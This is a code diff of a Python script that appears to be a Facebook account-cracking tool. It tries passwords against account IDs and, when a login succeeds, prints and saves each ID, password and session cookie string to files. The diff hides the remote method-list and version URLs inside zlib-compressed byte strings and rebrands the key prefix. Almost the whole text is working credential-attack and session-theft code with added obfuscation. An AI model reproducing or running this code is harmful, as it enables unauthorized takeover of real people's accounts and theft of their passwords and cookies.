@@ -125,7 +125,7 @@ today = '\033[1;36m'+str(hari)+'\033[1;97m-\033[1;36m'+str(bulan)+'\033[1;97m-\0
 #--------------------------------[METHOD 1]--------------------------------#
 _method_1_buffer = BytesIO()
 _method_1_curl = pycurl.Curl()
-_method_1_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot1.txt')
+_method_1_curl.setopt(pycurl.URL,(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%\x86 \x01\x00\xab\x86\x19\xd8')))
 _method_1_curl.setopt(pycurl.WRITEDATA, _method_1_buffer)
 _method_1_curl.perform()
 _method_1_data = _method_1_buffer.getvalue().decode('utf-8').splitlines()
@@ -136,7 +136,7 @@ def mls1():
 #--------------------------------[METHOD 2]--------------------------------#
 _method_2_buffer = BytesIO()
 _method_2_curl = pycurl.Curl()
-_method_2_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot2.txt')
+_method_2_curl.setopt(pycurl.URL,(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%F \x01\x00\xab\x8b\x19\xd9'))
 _method_2_curl.setopt(pycurl.WRITEDATA, _method_2_buffer)
 _method_2_curl.perform()
 _method_2_data = _method_2_buffer.getvalue().decode('utf-8').splitlines()
@@ -147,7 +147,7 @@ def mls2():
 #--------------------------------[METHOD 3]--------------------------------#
 _method_3_buffer = BytesIO()
 _method_3_curl = pycurl.Curl()
-_method_3_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot3.txt')
+_method_3_curl.setopt(pycurl.URL,(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x06\t\x00\x00\xaa0\x19\xba')))
 _method_3_curl.setopt(pycurl.WRITEDATA, _method_3_buffer)
 _method_3_curl.perform()
 _method_3_data = _method_3_buffer.getvalue().decode('utf-8').splitlines()
@@ -158,7 +158,7 @@ def mls3():
 #--------------------------------[METHOD 4]--------------------------------#
 _method_4_buffer = BytesIO()
 _method_4_curl = pycurl.Curl()
-_method_4_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot4.txt')
+_method_4_curl.setopt(pycurl.URL,(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x01\t\x00\x00\xaa5\x19\xbb')))
 _method_4_curl.setopt(pycurl.WRITEDATA, _method_4_buffer)
 _method_4_curl.perform()
 _method_4_data = _method_4_buffer.getvalue().decode('utf-8').splitlines()
@@ -169,7 +169,7 @@ def mls4():
 #--------------------------------[METHOD 5]--------------------------------#
 _method_5_buffer = BytesIO()
 _method_5_curl = pycurl.Curl()
-_method_5_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot5.txt')
+_method_5_curl.setopt(pycurl.URL,(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x05\t\x00\x00\xaa:\x19\xbc')))
 _method_5_curl.setopt(pycurl.WRITEDATA, _method_5_buffer)
 _method_5_curl.perform()
 _method_5_data = _method_5_buffer.getvalue().decode('utf-8').splitlines()
@@ -180,7 +180,7 @@ def mls5():
 #--------------------------------[METHOD 6]--------------------------------#
 _method_6_buffer = BytesIO()
 _method_6_curl = pycurl.Curl()
-_method_6_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot6.txt')
+_method_6_curl.setopt(pycurl.URL,(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x03\t\x00\x00\xaa?\x19\xbd')))
 _method_6_curl.setopt(pycurl.WRITEDATA, _method_6_buffer)
 _method_6_curl.perform()
 _method_6_data = _method_6_buffer.getvalue().decode('utf-8').splitlines()
@@ -200,7 +200,7 @@ def ua_valid():
     return rc([redmi4])
 #--------------------------------[VERSION CHANGE]--------
 try:
-    version = requests.get('https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Version.txt').text
+    version = requests.get((zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\x0fK-*\xce\xcc\xcf\x03\t\x00\x00\xab\xe0\x1a\x00'))).text
 except:
     print('No Internet Connection.....');exit()
 version = version.strip()
@@ -279,7 +279,7 @@ else:
 class Process:
     def __init__(self):
         self.cc=[]
-        self.key="ATOM-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
+        self.key="ZEROXD-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
         #self.key=""
         self.clear()
         r = self.Gex('https://github.com/ATONxSMILE404/APPRO/blob/main/Approve.txt')
@@ -1098,12 +1098,11 @@ def __MTDONEE__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                cookies = response_data.get("session_cookies")
-                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 oks.append(ids)
-                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1195,12 +1194,11 @@ def __MTDTWOO__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                cookies = response_data.get("session_cookies")
-                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 oks.append(ids)
-                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1292,12 +1290,11 @@ def __MTDTHREE__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                cookies = response_data.get("session_cookies")
-                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 oks.append(ids)
-                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1389,12 +1386,11 @@ def __MTDFOUR__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                cookies = response_data.get("session_cookies")
-                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 oks.append(ids)
-                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
@@ -1492,12 +1488,11 @@ def __MTDFIVE__(ids, names, passlist, total_ids):
             q = json.loads(po)
             if 'access_token' in q:
                 response_data = json.loads(po)
-                cookies = response_data.get("session_cookies")
-                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
                 print(f'\r\r{rad}[{green}zar0-OK{rad}]{green} {ids} {rad}: {green}{pas}')
-                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
+                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                 oks.append(ids)
-                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/zar0-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                 break
             elif "User must verify their account" in po:
                 cps.append(ids)
